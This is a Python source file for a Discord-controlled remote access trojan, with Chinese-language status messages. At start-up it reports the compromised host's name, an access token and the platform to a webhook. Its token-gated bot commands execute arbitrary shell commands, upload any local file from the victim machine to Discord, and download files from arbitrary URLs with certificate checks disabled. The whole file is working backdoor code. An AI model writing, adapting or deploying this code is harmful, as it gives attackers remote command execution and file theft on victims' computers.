import os
import sys
import string
import random
import requests
import discord
from contextlib import closing
from discord.ext import commands
bot = commands.Bot(command_prefix='!')

secret = ""
webhook = ""
token = "".join([random.choice(string.ascii_uppercase) for i in range(8)])
hostname = os.popen('hostname').read().strip()
sh = "cmd.exe /c"
if "linux" in sys.platform or "darwin" in sys.platform:
    sh = "/bin/sh -c"

def sayhello():
    url = webhook
    data = {
        "content": "叮~  新的主机已上线\nHost: " + hostname + "\nToken: " + token + "\n平台: " + sys.platform
    }
    requests.post(url, data=data)

@bot.event
async def on_ready():
    print('Name:', end=' ')
    print(bot.user.name)
    print('ID: ')
    print(bot.user.id)
    sayhello()

@bot.command(pass_context=True)
async def runcmd(ctx, t: str, command: str):
    if t == token:
        await ctx.send(runcommands(command))

@bot.command(pass_context=True)
async def upload(ctx, t: str, filepath: str):
    if t == token:
        with open(filepath, "rb") as file:
            await ctx.send("上传成功: ", file=discord.File(file, filepath.split(os.sep)[-1]))

@bot.command(pass_context=True)
async def download(ctx, t: str, url: str):
    if t == token:
        await ctx.send("下载成功: " + downloadfile(url))

def runcommands(cmd):
    res = os.popen(sh + ' "{}"'.format(cmd)).read()
    if res == "":
        res = cmd + " 执行成功"
    return res

def downloadfile(url):
    with closing(requests.get(url=url, verify=False, stream=True)) as res:
        with open(url.split("/")[-1], 'wb') as fd:
            for chunk in res.iter_content(chunk_size=1024):
                if chunk:
                    fd.write(chunk)
    return os.getcwd() + os.sep + url.split("/")[-1]

bot.run(secret)
